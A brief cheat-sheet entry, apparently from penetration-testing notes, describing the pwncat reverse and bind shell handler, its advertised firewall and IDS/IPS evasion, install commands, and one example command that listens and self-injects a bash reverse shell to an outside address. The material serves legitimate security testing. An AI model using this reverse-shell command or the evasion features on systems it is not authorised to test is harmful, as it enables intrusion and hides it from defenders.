### Pwncat

`pwncat` is a sophisticated bind and reverse shell handler with many features as well as a drop-in replacement or compatible complement to `netcat`, `ncat` or `socat`.

  

> pwncat is like netcat on steroids with Firewall, IDS/IPS evasion, bind and reverse shell, self-injecting shell and forwarding magic - and its fully scriptable with Python ([PSE](https://github.com/cytopia/pwncat/tree/master/pse))

**Install pwncat**

```
# Kali Linux
sudo apt install pwncat


# pip
python3 -m pip install pwncat
```



```bash
pwncat -l 4444 --self-inject /bin/bash:10.0.0.1:4445+3
```
